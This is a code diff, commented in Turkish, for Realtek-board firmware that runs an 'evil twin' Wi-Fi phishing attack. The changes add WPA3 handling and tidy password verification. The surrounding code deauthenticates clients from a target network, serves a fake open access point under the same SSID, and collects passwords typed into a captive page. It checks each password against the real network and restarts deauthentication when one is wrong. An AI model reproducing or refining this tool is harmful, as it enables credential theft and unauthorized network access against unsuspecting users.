@@ -31,6 +31,9 @@
 #ifndef ENC_TYPE_CCMP
 #define ENC_TYPE_CCMP  4
 #endif
+#ifndef ENC_TYPE_WPA3
+#define ENC_TYPE_WPA3  5   // WPA3-SAE / WPA2+WPA3 mixed
+#endif
 
 // LOW-LEVEL REALTEK KÜTÜPHANELERİ
 extern "C" {
@@ -242,11 +245,12 @@ struct SavedCredentials {
 };
 
 struct NetworkInfo {
-  String  ssid;
-  uint8_t bssid[6]; 
-  int32_t rssi;
-  uint8_t enc;
-  int32_t channel; 
+  String         ssid;
+  uint8_t        bssid[6];
+  int32_t        rssi;
+  uint8_t        enc;       // Basitleştirilmiş tip (UI için)
+  rtw_security_t raw_sec;   // Sürücüden gelen tam güvenlik tipi
+  int32_t        channel;
 };
 
 typedef enum { CS_IDLE = 0, CS_RUNNING = 1, CS_DONE_OK = 2, CS_DONE_FAIL = 3 } ConnStatus;
@@ -262,8 +266,9 @@ unsigned long revert_time = 0;
 char target_ssid[MAX_SSID_LEN] = {0};
 uint8_t target_bssid[6]    = {0};
 uint8_t target_5g_bssid[6] = {0};  // Tespit edilen 5GHz BSSID (sıfırsa henüz yok)
-int32_t target_channel = 6;
-uint8_t target_enc = ENC_TYPE_CCMP;
+int32_t        target_channel = 6;
+uint8_t        target_enc     = ENC_TYPE_CCMP;   // UI için basit tip (kalsın)
+rtw_security_t target_sec     = RTW_SECURITY_WPA2_AES_PSK; // Bağlantı için tam tip
 volatile int32_t target_5g_channel = 0;  // 0 = henüz tespit edilmedi
 
 volatile bool deauth_active = false;
@@ -286,7 +291,7 @@ char saved_ssid[MAX_SSID_LEN]   = {0};
 char saved_pass[MAX_PASS_LEN]   = {0};
 char pending_ssid[MAX_SSID_LEN] = {0};
 char pending_pass[MAX_PASS_LEN] = {0};
-uint8_t pending_enc             = ENC_TYPE_CCMP;
+rtw_security_t pending_sec      = RTW_SECURITY_WPA2_AES_PSK;
 bool sta_connected  = false;
 String conn_result  = "";
 
@@ -367,9 +372,13 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
     
     memcpy(net.bssid, record->BSSID.octet, 6);
     
+    // Tam güvenlik tipini sakla (bağlantıda nokta atışı kullanım için)
+    net.raw_sec = record->security;
+    // Basitleştirilmiş tip (UI gösterimi için)
     if (record->security == RTW_SECURITY_OPEN) net.enc = ENC_TYPE_NONE;
     else if (record->security == RTW_SECURITY_WEP_PSK) net.enc = ENC_TYPE_WEP;
     else if (record->security == RTW_SECURITY_WPA_TKIP_PSK || record->security == RTW_SECURITY_WPA_AES_PSK || record->security == RTW_SECURITY_WPA_MIXED_PSK) net.enc = ENC_TYPE_TKIP;
+    else if (record->security == RTW_SECURITY_WPA3_AES_PSK || record->security == RTW_SECURITY_WPA2_WPA3_MIXED) net.enc = ENC_TYPE_WPA3;
     else net.enc = ENC_TYPE_CCMP;
     
     if (net.ssid.length() > 0) {
@@ -384,10 +393,11 @@ rtw_result_t raw_scan_handler(rtw_scan_handler_result_t *malloced_scan_result) {
         if (existing.ssid == net.ssid) {
           dup = true;
           if (net.rssi > existing.rssi) {
-            existing.rssi = net.rssi;
+            existing.rssi    = net.rssi;
             existing.channel = net.channel;
-            existing.enc = net.enc;
-            memcpy(existing.bssid, net.bssid, 6); 
+            existing.enc     = net.enc;
+            existing.raw_sec = net.raw_sec;
+            memcpy(existing.bssid, net.bssid, 6);
           }
           break;
         }
@@ -428,28 +438,54 @@ void startScan() {
 // ─── BAĞLANTI GÖREVİ ─────────────────────────────────────────────────────────
 void wifiConnectTask(void *param) {
   (void)param;
-  bool is_open = (mapSecurity(pending_enc) == RTW_SECURITY_OPEN);
+  // Taramadan gelen TAM güvenlik tipi — nokta atışı, tek deneme yeterli
+  bool is_open  = (pending_sec == RTW_SECURITY_OPEN);
   int  pass_len = is_open ? 0 : (int)strlen(pending_pass);
-  rtw_security_t try_sec[] = { mapSecurity(pending_enc), RTW_SECURITY_WPA2_AES_PSK, RTW_SECURITY_WPA2_MIXED_PSK };
-  int try_count = is_open ? 1 : 3;
-  int ret = RTW_ERROR;
+  int  ret      = RTW_ERROR;
 
-  for (int t = 0; t < try_count; t++) {
+  Serial.print("[Connect] Guvenlik tipi: "); Serial.println((int)pending_sec);
+
+  wifi_disconnect();
+  vTaskDelay(pdMS_TO_TICKS(300));
+
+  TickType_t t_start = xTaskGetTickCount();
+  ret = wifi_connect((char *)pending_ssid, pending_sec,
+                     (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
+  uint32_t elapsed_ms = (xTaskGetTickCount() - t_start) * portTICK_PERIOD_MS;
+
+  if (ret == RTW_SUCCESS) {
+    vTaskDelay(pdMS_TO_TICKS(500));
+    if (wifi_is_connected_to_ap() != RTW_SUCCESS) ret = RTW_ERROR;
+  }
+
+  // Eğer hızlı başarısız olduysa (< 2sn) güvenlik tipi uyuşmamış olabilir — yedek dene
+  if (ret != RTW_SUCCESS && !is_open && elapsed_ms < 2000) {
+    rtw_security_t fallback;
+    if (pending_sec == RTW_SECURITY_WPA3_AES_PSK) {
+      // WPA3-only ağ → WPA2/WPA3 karışık modla dene
+      fallback = RTW_SECURITY_WPA2_WPA3_MIXED;
+      Serial.println("[Connect] WPA3 hizli fail — WPA2_WPA3_MIXED yedek deneme.");
+    } else if (pending_sec == RTW_SECURITY_WPA2_WPA3_MIXED) {
+      // Mixed mod başarısız → saf WPA3 dene
+      fallback = RTW_SECURITY_WPA3_AES_PSK;
+      Serial.println("[Connect] WPA2_WPA3_MIXED hizli fail — WPA3_AES_PSK yedek deneme.");
+    } else {
+      // WPA2 → MIXED_PSK yedek
+      fallback = RTW_SECURITY_WPA2_MIXED_PSK;
+      Serial.println("[Connect] WPA2 hizli fail — WPA2_MIXED_PSK yedek deneme.");
+    }
     wifi_disconnect();
     vTaskDelay(pdMS_TO_TICKS(300));
-    // wext_set_mode KALDIRILDI: STA_AP modunda wlan0 zaten infra modunda,
-    // çağırmak AP arayüzünü (wlan1) bozuyor.
-    ret = wifi_connect((char *)pending_ssid, try_sec[t], (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
+    ret = wifi_connect((char *)pending_ssid, fallback,
+                       (char *)pending_pass, (int)strlen(pending_ssid), pass_len, -1, NULL);
     if (ret == RTW_SUCCESS) {
       vTaskDelay(pdMS_TO_TICKS(500));
-      if (wifi_is_connected_to_ap() == RTW_SUCCESS) break;
-      else ret = RTW_ERROR;
+      if (wifi_is_connected_to_ap() != RTW_SUCCESS) ret = RTW_ERROR;
     }
-    if (t < try_count - 1) vTaskDelay(pdMS_TO_TICKS(2000));
   }
 
   if (ret == RTW_SUCCESS) {
-    vTaskDelay(pdMS_TO_TICKS(500)); 
+    vTaskDelay(pdMS_TO_TICKS(500));
     conn_status = CS_DONE_OK;
   } else {
     conn_status = CS_DONE_FAIL;
@@ -628,7 +664,12 @@ void sendStartPage(WiFiClient &client) {
     
     client.print("<li class='net-item' onclick=\"document.getElementById('r"); client.print(i); client.print("').checked=true\">");
     client.print("<input type='radio' name='ssid' id='r"); client.print(i); client.print("' value='"); client.print(safe); client.print("' required>");
-    client.print("<div class='net-info'><div class='net-name'>"); client.print(safe); client.print("</div>");
+    client.print("<div class='net-info'><div class='net-name'>"); client.print(safe);
+    // Güvenlik rozeti
+    if      (networks[i].enc == ENC_TYPE_NONE) client.print(" <span style='font-size:.7rem;background:#e74c3c;color:#fff;padding:2px 5px;border-radius:4px;'>Açık</span>");
+    else if (networks[i].enc == ENC_TYPE_WPA3) client.print(" <span style='font-size:.7rem;background:#8e44ad;color:#fff;padding:2px 5px;border-radius:4px;'>WPA3</span>");
+    else if (networks[i].enc == ENC_TYPE_TKIP) client.print(" <span style='font-size:.7rem;background:#e67e22;color:#fff;padding:2px 5px;border-radius:4px;'>WPA</span>");
+    client.print("</div>");
     client.print("<div class='net-meta'>Sinyal Kalitesi: "); client.print(rssiBar(networks[i].rssi)); client.print("</div></div></li>");
   }
   if (networks.empty() && scan_status != SCAN_RUNNING) {
@@ -842,15 +883,17 @@ void handleClient(WiFiClient &client) {
       strncpy(target_ssid, sel_ssid.c_str(), MAX_SSID_LEN - 1);
       target_ssid[MAX_SSID_LEN - 1] = '\0';
       target_channel = 6;
-      target_enc = ENC_TYPE_CCMP;
+      target_enc     = ENC_TYPE_CCMP;
+      target_sec     = RTW_SECURITY_WPA2_AES_PSK;
       target_5g_channel = 0;
       memset(target_5g_bssid, 0, 6);
-      
+
       if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
       for (auto &net : networks) {
         if (net.ssid == sel_ssid) {
           target_channel = net.channel;
-          target_enc = net.enc;
+          target_enc     = net.enc;
+          target_sec     = net.raw_sec;   // Sürücüden gelen tam güvenlik tipi
           memcpy(target_bssid, net.bssid, 6);
           break;
         }
@@ -878,7 +921,7 @@ void handleClient(WiFiClient &client) {
     pending_ssid[MAX_SSID_LEN - 1] = '\0';
     strncpy(pending_pass, sel_pass.c_str(), MAX_PASS_LEN - 1);
     pending_pass[MAX_PASS_LEN - 1] = '\0';
-    pending_enc = target_enc;
+    pending_sec = target_sec;
     
     conn_result = "";
     startConnectTask();
@@ -1022,21 +1065,14 @@ void loop() {
     sta_connected = false; conn_result = "fail"; conn_status = CS_IDLE;
     
     if (ap_switched) {
-      // Mod sıfırlaması YOK — zaten RTW_MODE_STA_AP modundayız.
-      // wifi_connect() AP'yi biraz bozmuş olabilir, sadece AP'yi yeniden aç.
+      // AP'ye dokunma — RTW_MODE_STA_AP modunda, aynı kanalda çalışırken
+      // wifi_connect() başarısız olsa dahi AP arayüzü sağlam kalır.
+      // Sadece deauth task'ı yeniden başlat.
       deauth_active = false;
-      delay(200);
-      dnsServer.stop();
-      wifi_start_ap((char *)target_ssid, RTW_SECURITY_OPEN, NULL, strlen(target_ssid), 0, target_channel);
-      delay(800);
-      netif_set_up(&xnetif[1]);
-      netif_set_link_up(&xnetif[1]);
-      delay(100);
-      dnsServer.begin();
-      ap_running_channel = target_channel;
-      Serial.println("[Fail] Sahte AP yeniden kuruldu (mod degistirilmedi).");
+      delay(50);
       deauth_active = true;
       xTaskCreate(deauthTask, "deauth_tsk", 4096, NULL, tskIDLE_PRIORITY + 1, NULL);
+      Serial.println("[Fail] Sifre yanlis — AP dokunulmadi, deauth yeniden basladi.");
     }
   }
 
